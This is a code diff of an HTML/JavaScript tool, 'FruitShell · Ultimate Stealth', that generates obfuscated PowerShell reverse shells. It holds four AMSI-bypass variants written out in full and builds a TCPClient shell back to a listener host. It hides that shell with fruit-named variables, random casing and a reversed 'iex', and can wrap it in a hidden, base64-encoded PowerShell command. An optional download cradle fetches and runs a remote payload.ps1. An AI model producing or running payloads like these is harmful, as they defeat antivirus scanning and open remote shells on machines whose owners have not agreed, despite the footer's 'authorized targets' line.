@@ -3,195 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🍍 FruitShell · Ultimate Stealth Edition</title>
+    <title>🍍 FruitShell · Ultimate Stealth</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
-            font-family: 'Inter', 'Segoe UI', 'Fira Code', monospace;
+            background: linear-gradient(145deg, #0f1629 0%, #0a0f1e 100%);
+            font-family: 'Inter', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 1.5rem;
+            padding: 20px;
             color: #e2e9ff;
         }
         .shell-card {
-            max-width: 1150px;
+            max-width: 1180px;
             width: 100%;
-            background: rgba(18, 25, 45, 0.94);
-            backdrop-filter: blur(14px);
-            border-radius: 2.8rem;
-            border: 1px solid rgba(255, 215, 130, 0.3);
-            box-shadow: 0 30px 70px -15px rgba(0,0,0,0.75);
+            background: #1a2338;
+            border-radius: 24px;
+            border: 1px solid #f4b94233;
+            box-shadow: 0 25px 60px -10px rgba(0,0,0,0.6);
             overflow: hidden;
         }
-        .fruit-header {
-            background: #1e2a3a;
-            padding: 1.4rem 2.2rem;
-            border-bottom: 3px solid #f4b942;
+        .header {
+            background: #111827;
+            padding: 24px 32px;
             display: flex;
             align-items: center;
+            gap: 16px;
             flex-wrap: wrap;
-            gap: 1rem;
-            justify-content: space-between;
         }
-        .title-badge {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            font-size: 1.85rem;
+        .fruits { font-size: 28px; }
+        .title {
+            font-size: 2.1rem;
             font-weight: 700;
+            background: linear-gradient(90deg, #ffd966, #ff9f4a);
+            -webkit-background-clip: text;
+            color: transparent;
         }
-        .title-badge span:first-child { font-size: 2.4rem; filter: drop-shadow(0 2px 6px rgba(0,0,0,0.4)); }
-        .title-badge h1 { background: linear-gradient(135deg, #FFD966, #FFB347); -webkit-background-clip: text; color: transparent; }
-        .fruit-tag {
+        .tag {
             background: #2c3e2f;
-            padding: 0.4rem 1.2rem;
-            border-radius: 50px;
-            font-size: 0.85rem;
             color: #c9e9b0;
+            padding: 6px 16px;
+            border-radius: 9999px;
+            font-size: 0.9rem;
             border: 1px solid #84b372;
         }
-        .input-panel { padding: 2.2rem 2.2rem 1.8rem; background: #0f1622; }
-        .field-group { display: flex; flex-wrap: wrap; gap: 1.6rem; margin-bottom: 1.6rem; }
-        .input-field, .select-field { flex: 1; min-width: 220px; }
-        .input-field label, .select-field label {
+        .input-area {
+            padding: 32px;
+            background: #111827;
+        }
+        .input-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        .label {
             display: block;
-            font-size: 0.82rem;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #c0cfef;
-            margin-bottom: 0.6rem;
+            letter-spacing: 1px;
+            color: #a3bffa;
         }
-        .input-field input, .select-field select {
+        input, select {
             width: 100%;
-            background: #010a1a;
-            border: 2px solid #2a374b;
-            border-radius: 60px;
-            padding: 1rem 1.4rem;
-            font-size: 1.12rem;
-            color: #f0f3ff;
+            background: #0a0f1e;
+            border: 2px solid #374151;
+            border-radius: 9999px;
+            padding: 14px 20px;
+            font-size: 1.1rem;
+            color: white;
         }
-        .select-field select { font-family: inherit; }
+        input:focus, select:focus {
+            border-color: #f4b942;
+            outline: none;
+        }
         .controls {
             display: flex;
             flex-wrap: wrap;
-            gap: 1.2rem;
+            gap: 16px;
             align-items: center;
-            margin: 1.2rem 0;
+            margin: 20px 0;
         }
         .btn {
-            padding: 0.8rem 1.9rem;
-            border-radius: 50px;
+            padding: 12px 24px;
+            border-radius: 9999px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.25s;
-            border: 1px solid #3a455b;
-            font-size: 0.95rem;
+            transition: all 0.2s;
+            border: none;
         }
-        .btn-primary { background: #e68a2e; color: #0a0f1a; border-color: #ffbc6e; }
-        .btn-primary:hover { background: #ff9f4a; transform: scale(1.04); }
-        .pre-wrap {
-            background: #03060e;
-            border-radius: 1.6rem;
-            border: 1px solid #2f3b4e;
-            padding: 1.7rem;
+        .btn-primary {
+            background: linear-gradient(90deg, #f59e0b, #fb923c);
+            color: #111827;
+            font-size: 1.05rem;
+        }
+        .btn-primary:hover { transform: translateY(-2px); }
+        .output-box {
+            background: #0a0f1e;
+            border-radius: 16px;
+            padding: 18px;
+            margin-top: 16px;
+            border: 1px solid #374151;
             font-family: 'Fira Code', monospace;
-            font-size: 0.81rem;
-            line-height: 1.48;
-            color: #e2e9ff;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: #e0e7ff;
             white-space: pre-wrap;
             overflow-x: auto;
-            max-height: 480px;
+            max-height: 380px;
         }
-        .flash { animation: flashAnim 0.9s ease; }
-        @keyframes flashAnim { 0%,100% { background:#2a3a1e; } 50% { background:#1e2a1a; } }
+        .output-header {
+            background: #1f2937;
+            padding: 8px 16px;
+            border-radius: 9999px;
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
         footer {
-            background:#090e18;
-            padding:1.1rem 2.2rem;
-            font-size:0.76rem;
-            text-align:center;
-            color:#5b6e8c;
-            border-top:1px solid #1e293b;
+            text-align: center;
+            padding: 18px;
+            font-size: 0.8rem;
+            color: #64748b;
+            background: #111827;
         }
-        .status { font-size:0.82rem; background:#1f2a36; padding:0.35rem 1rem; border-radius:30px; }
+        .flash { animation: flash 800ms; }
+        @keyframes flash { 0%,100% { background:#1f2937; } 50% { background:#374151; } }
     </style>
 </head>
 <body>
 <div class="shell-card">
-    <div class="fruit-header">
-        <div class="title-badge">
-            <span>🍒🍊🍉🍍🥝🍓</span>
-            <h1>FruitShell · Ultimate Stealth</h1>
+    <div class="header">
+        <div class="fruits">🍒🍊🍉🍍🥝🍓</div>
+        <div>
+            <div class="title">FruitShell · Ultimate Stealth</div>
+            <div class="tag">AMSI Variants + UTF-16LE + Reversal 🍇</div>
         </div>
-        <div class="fruit-tag">🍇 AMSI Variants + UTF-16LE + Reversal 🥭</div>
     </div>
 
-    <div class="input-panel">
-        <div class="field-group">
-            <div class="input-field">
-                <label>🍎 LISTENER IP / HOSTNAME</label>
-                <input type="text" id="ip" placeholder="10.10.14.2 or attacker.com" spellcheck="false">
+    <div class="input-area">
+        <div class="input-row">
+            <div>
+                <div class="label">🍎 LISTENER IP / HOSTNAME</div>
+                <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.45">
             </div>
-            <div class="input-field">
-                <label>🍊 PORT</label>
-                <input type="text" id="port" placeholder="4444" spellcheck="false">
+            <div>
+                <div class="label">🍊 PORT</div>
+                <input type="text" id="port" placeholder="443" value="443">
             </div>
         </div>
 
-        <div class="field-group">
-            <div class="select-field">
-                <label>AMSI Bypass Variant</label>
-                <select id="amsiVariant">
-                    <option value="0">Classic Concat (A + msiUtils)</option>
-                    <option value="1" selected>Double Split (Heavy Fruit Style)</option>
-                    <option value="2">Reflected + Random Case</option>
-                    <option value="3">Minimal InitFailed Only</option>
-                </select>
-            </div>
+        <div>
+            <div class="label">AMSI BYPASS VARIANT</div>
+            <select id="amsiVariant">
+                <option value="0">Classic Concat</option>
+                <option value="1" selected>Double Split (Heavy Fruit Style)</option>
+                <option value="2">Reflected + Random Case</option>
+                <option value="3">Minimal InitFailed Only</option>
+            </select>
         </div>
 
         <div class="controls">
-            <div style="display:flex; align-items:center; gap:10px;">
-                <label>Stealth Level:</label>
-                <input type="range" id="stealthLevel" min="1" max="4" value="3" style="width:180px;">
-                <span id="levelDisplay" style="font-weight:600; color:#ffcd85;">Level 3 🍉</span>
+            <div>
+                <label>Stealth Level: </label>
+                <input type="range" id="stealthLevel" min="1" max="4" value="3" style="width:200px;">
+                <span id="levelDisplay" style="margin-left:10px; color:#f4b942;">Level 3 🍓</span>
             </div>
             <label><input type="checkbox" id="ultraMode" checked> Extra Fruit Chaos</label>
-            <label><input type="checkbox" id="compressMode"> Compress + EncodedCommand</label>
+            <label><input type="checkbox" id="compressMode" checked> Compress + EncodedCommand</label>
             <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE Encoding</label>
             <label><input type="checkbox" id="cradleMode"> Use Download Cradle</label>
             <label><input type="checkbox" id="oneLinerMode"> Force One-Liner</label>
         </div>
 
-        <div style="display:flex; gap:1rem; flex-wrap:wrap;">
+        <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:20px;">
             <button class="btn btn-primary" id="generateBtn">🍍 GENERATE ULTIMATE FRUIT SHELL 🍍</button>
-            <button class="btn" id="copyBtn" disabled>📋 Copy Payload</button>
-            <button class="btn" id="copyEncodedBtn" disabled>📋 Copy EncodedCommand</button>
-            <button class="btn" id="copyFullBtn" disabled>📋 Copy Full Command</button>
-            <button class="btn" id="clearBtn">🧹 Clear</button>
+            <button class="btn" style="background:#374151; color:white;" id="copyPayloadBtn" disabled>📋 Copy Payload</button>
+            <button class="btn" style="background:#374151; color:white;" id="copyEncodedBtn" disabled>📋 Copy EncodedCommand</button>
+            <button class="btn" style="background:#374151; color:white;" id="copyFullBtn" disabled>📋 Copy Full Command</button>
+            <button class="btn" style="background:#374151; color:white;" id="clearBtn">🧹 Clear</button>
         </div>
     </div>
 
-    <div style="padding:0 2.2rem 2.2rem;">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
-            <span style="background:#2a1f1a; padding:0.35rem 1.1rem; border-radius:25px; font-size:0.8rem; color:#ffcd85;">
-                🍬 FRUIT-OBFUSCATED STEALTH PAYLOAD 🍬
-            </span>
-            <span id="statusHint" class="status">ready</span>
-        </div>
-        <div id="shell-script" class="pre-wrap">
-# Select AMSI variant and click Generate
-        </div>
+    <!-- Obfuscated / Encoded Output -->
+    <div style="padding:0 32px 20px;">
+        <div class="output-header">🔒 FRUIT-OBFUSCATED STEALTH PAYLOAD</div>
+        <div id="obfuscatedOutput" class="output-box"># Click Generate to create payload...</div>
+    </div>
+
+    <!-- Decoded / Readable Output -->
+    <div style="padding:0 32px 32px;">
+        <div class="output-header">📜 DECODED / READABLE VERSION</div>
+        <div id="decodedOutput" class="output-box"># Decoded version will appear here after generation...</div>
     </div>
 
     <footer>
-        🍌 Multiple AMSI bypass variants • Fruit obfuscation • UTF-16LE • String reversal • Use responsibly on authorized targets only
+        🍌 Multiple AMSI bypass variants • Fruit obfuscation • UTF-16LE • String reversal • Use only on authorized targets
     </footer>
 </div>
 
 <script>
+    // ... (same fruitBase, getRandomFruit, randomCase, obfuscateString, reverseString, getAmsiBypass, toUtf16LEBase64 functions as before)
+
     const fruitBase = ["mango","kiwi","lychee","papaya","guava","dragon","passion","starfruit","durian","jackfruit","rambutan","mangosteen","pitaya","tamarind","persimmon","quince","boysen","elder","goose","currant","pineapple","cherry","banana","orange","lime","lemon"];
 
     function getRandomFruit(used) {
@@ -202,82 +220,56 @@
         return picked;
     }
 
-    function randomCase(str) {
-        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-    }
-
+    function randomCase(str) { return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''); }
     function obfuscateString(str, level) {
-        let result = '';
-        const used = new Set();
+        let result = ''; const used = new Set();
         for (let char of str) {
             if (Math.random() < 0.4 + level * 0.2) {
                 const f = getRandomFruit(used);
                 result += `$${f}='${char}';`;
-            } else {
-                result += `'${char}' + `;
-            }
+            } else result += `'${char}' + `;
         }
         return result.replace(/\s*\+\s*$/, '');
     }
-
-    function reverseString(s) {
-        return s.split('').reverse().join('');
-    }
+    function reverseString(s) { return s.split('').reverse().join(''); }
 
     function getAmsiBypass(variant, stealthLevel) {
-        const used = new Set();
-        const f = () => getRandomFruit(used);
-
-        if (variant === "0") { // Classic Concat
-            return `$a='System.Management.Automation.A';$b='msiUtils';\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
-        }
-        if (variant === "1") { // Double Split (heavier fruit style)
+        const used = new Set(); const f = () => getRandomFruit(used);
+        if (variant === "0") return `$a='System.Management.Automation.A';$b='msiUtils';$c=[Ref].Assembly.GetType($a+$b);$d=$c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true);`;
+        if (variant === "1") {
             let a1 = obfuscateString('System.Management.Automation.', stealthLevel);
             let a2 = obfuscateString('AmsiUtils', stealthLevel);
-            return `${a1}$b=${a2};\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
+            return `${a1}$b=${a2};$c=[Ref].Assembly.GetType($a+$b);$d=$c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true);`;
         }
-        if (variant === "2") { // Reflected + Random Case
-            return `$${f()}=[Ref].Assembly.GetType('${randomCase('System.Management.Automation.AmsiUtils')}');\n$${f()}=$${f()}.GetField('${randomCase('amsiInitFailed')}','NonPublic,Static');\n$${f()}.SetValue($null,$true);`;
-        }
-        if (variant === "3") { // Minimal
-            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`;
-        }
+        if (variant === "2") return `$${f()}=[Ref].Assembly.GetType('${randomCase('System.Management.Automation.AmsiUtils')}');$${f()}=$${f()}.GetField('${randomCase('amsiInitFailed')}','NonPublic,Static');$${f()}.SetValue($null,$true);`;
+        if (variant === "3") return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`;
         return '';
     }
 
     function toUtf16LEBase64(str) {
         let utf16le = '';
-        for (let i = 0; i < str.length; i++) {
-            utf16le += str.charCodeAt(i) + '\0';
-        }
+        for (let i = 0; i < str.length; i++) utf16le += str.charCodeAt(i) + '\0';
         return btoa(utf16le);
     }
 
     function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, utf16, cradle, oneLiner, amsiVariant) {
-        const used = new Set();
-        const f = () => getRandomFruit(used);
-
+        const used = new Set(); const f = () => getRandomFruit(used);
         const amsiBypass = getAmsiBypass(amsiVariant, stealthLevel);
 
-        const client = f(); const stream = f(); const writer = f();
-        const buffer = f(); const data = f(); const raw = f();
-
-        let ipAssignments = '';
-        let ipExprParts = [];
+        const client = f(), stream = f(), writer = f(), buffer = f(), data = f(), raw = f();
+        let ipAssignments = '', ipExprParts = [];
         ip.split('').forEach(char => {
             const v = f();
             ipAssignments += `$${v}='${char}';`;
             ipExprParts.push(`$${v}`);
         });
         const ipExpr = ipExprParts.join('+');
-
         let portExpr = `'${portStr}'`;
         if (stealthLevel >= 3) portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');
 
         let iexReversed = reverseString('xei');
 
-        let core = `
-${amsiBypass}
+        let core = `${amsiBypass}
 $ErrorActionPreference = 'SilentlyContinue';
 ${ipAssignments}
 $${client} = New-Object (${obfuscateString('System.Net.Sockets.TCPClient', stealthLevel)})(${ipExpr}, ${portExpr});
@@ -294,14 +286,16 @@ $${client}.Close();`.trim();
         if (ultra) core = core.replace(/New-Object/g, randomCase('New-Object'));
         if (cradle) core = `IEX((New-Object Net.WebClient).DownloadString('http://${ip}:${portStr}/payload.ps1'));\n` + core;
 
+        const readable = core;
+
         if (compress) {
             const encoded = utf16 ? toUtf16LEBase64(core) : btoa(unescape(encodeURIComponent(core)));
-            return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+            const fullEncoded = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+            return { obfuscated: fullEncoded, decoded: readable };
         }
 
         if (oneLiner) core = core.replace(/\s+/g, ' ').trim();
-
-        return core;
+        return { obfuscated: core, decoded: readable };
     }
 
     // DOM
@@ -315,13 +309,14 @@ $${client}.Close();`.trim();
     const utf16Chk = document.getElementById('utf16Mode');
     const cradleChk = document.getElementById('cradleMode');
     const oneLinerChk = document.getElementById('oneLinerMode');
-    const genBtn = document.getElementById('generateBtn');
-    const copyBtn = document.getElementById('copyBtn');
+    const generateBtn = document.getElementById('generateBtn');
+    const obfuscatedOutput = document.getElementById('obfuscatedOutput');
+    const decodedOutput = document.getElementById('decodedOutput');
+
+    const copyPayloadBtn = document.getElementById('copyPayloadBtn');
     const copyEncodedBtn = document.getElementById('copyEncodedBtn');
     const copyFullBtn = document.getElementById('copyFullBtn');
     const clearBtn = document.getElementById('clearBtn');
-    const outputArea = document.getElementById('shell-script');
-    const statusHint = document.getElementById('statusHint');
 
     stealthSlider.addEventListener('input', () => {
         const lvl = parseInt(stealthSlider.value);
@@ -332,68 +327,59 @@ $${client}.Close();`.trim();
     function handleGenerate() {
         const ip = ipInput.value.trim();
         const portStr = portInput.value.trim();
-        const amsiVariant = amsiSelect.value;
-
-        if (!ip) return outputArea.textContent = '⚠️ Enter IP/hostname', statusHint.textContent = 'missing ip';
-        if (!portStr || isNaN(parseInt(portStr)) || parseInt(portStr) < 1 || parseInt(portStr) > 65535) {
-            outputArea.textContent = '⚠️ Port must be 1–65535';
-            statusHint.textContent = 'invalid port';
+        if (!ip || !portStr || isNaN(parseInt(portStr))) {
+            obfuscatedOutput.textContent = '⚠️ Please fill IP and valid Port';
             return;
         }
 
-        try {
-            const payload = generateUltimateFruitShell(
-                ip, portStr,
-                parseInt(stealthSlider.value),
-                ultraChk.checked,
-                compressChk.checked,
-                utf16Chk.checked,
-                cradleChk.checked,
-                oneLinerChk.checked,
-                amsiVariant
-            );
+        const result = generateUltimateFruitShell(
+            ip, portStr,
+            parseInt(stealthSlider.value),
+            ultraChk.checked,
+            compressChk.checked,
+            utf16Chk.checked,
+            cradleChk.checked,
+            oneLinerChk.checked,
+            amsiSelect.value
+        );
 
-            outputArea.textContent = payload;
-            outputArea.classList.add('flash');
-            setTimeout(() => outputArea.classList.remove('flash'), 1000);
+        obfuscatedOutput.textContent = result.obfuscated;
+        decodedOutput.textContent = result.decoded;
 
-            copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = false;
-            statusHint.textContent = '🍍 fruit shell with selected AMSI variant ready!';
-            setTimeout(() => statusHint.textContent = 'ready', 2800);
-        } catch (e) {
-            outputArea.textContent = `Error: ${e.message}`;
-            statusHint.textContent = 'error';
-        }
+        copyPayloadBtn.disabled = false;
+        copyEncodedBtn.disabled = !compressChk.checked;
+        copyFullBtn.disabled = false;
+
+        obfuscatedOutput.classList.add('flash');
+        decodedOutput.classList.add('flash');
+        setTimeout(() => {
+            obfuscatedOutput.classList.remove('flash');
+            decodedOutput.classList.remove('flash');
+        }, 800);
     }
 
-    function copyToClipboard(text, button, msg = '✅ Copied!') {
+    function copyToClipboard(text, btn) {
         navigator.clipboard.writeText(text).then(() => {
-            const orig = button.textContent;
-            button.textContent = msg;
-            setTimeout(() => button.textContent = orig, 1800);
+            const orig = btn.textContent;
+            btn.textContent = '✅ Copied!';
+            setTimeout(() => btn.textContent = orig, 1600);
         });
     }
 
-    genBtn.addEventListener('click', handleGenerate);
-    copyBtn.addEventListener('click', () => copyToClipboard(outputArea.textContent, copyBtn));
-    copyEncodedBtn.addEventListener('click', () => {
-        const encoded = generateUltimateFruitShell(ipInput.value.trim(), portInput.value.trim(), parseInt(stealthSlider.value), ultraChk.checked, true, utf16Chk.checked, cradleChk.checked, oneLinerChk.checked, amsiSelect.value);
-        copyToClipboard(encoded, copyEncodedBtn, '✅ EncodedCommand Copied!');
-    });
+    generateBtn.addEventListener('click', handleGenerate);
+    copyPayloadBtn.addEventListener('click', () => copyToClipboard(obfuscatedOutput.textContent, copyPayloadBtn));
+    copyEncodedBtn.addEventListener('click', () => copyToClipboard(obfuscatedOutput.textContent, copyEncodedBtn));
     copyFullBtn.addEventListener('click', () => {
-        const full = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${outputArea.textContent.replace(/"/g, '`"')}"`;
-        copyToClipboard(full, copyFullBtn, '✅ Full Command Copied!');
+        const full = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${obfuscatedOutput.textContent.replace(/"/g, '`"')}"`;
+        copyToClipboard(full, copyFullBtn);
     });
-
     clearBtn.addEventListener('click', () => {
-        ipInput.value = ''; portInput.value = '';
-        outputArea.textContent = '# Select AMSI variant and generate... 🍍';
-        copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
-        statusHint.textContent = 'cleared';
-        setTimeout(() => statusHint.textContent = 'ready', 1200);
+        obfuscatedOutput.textContent = '# Payload will appear here...';
+        decodedOutput.textContent = '# Readable version will appear here...';
+        copyPayloadBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
     });
 
-    [ipInput, portInput].forEach(el => el.addEventListener('keypress', e => { if (e.key === 'Enter') handleGenerate(); }));
+    [ipInput, portInput].forEach(el => el.addEventListener('keypress', e => { if(e.key === 'Enter') handleGenerate(); }));
 </script>
 </body>
 </html>
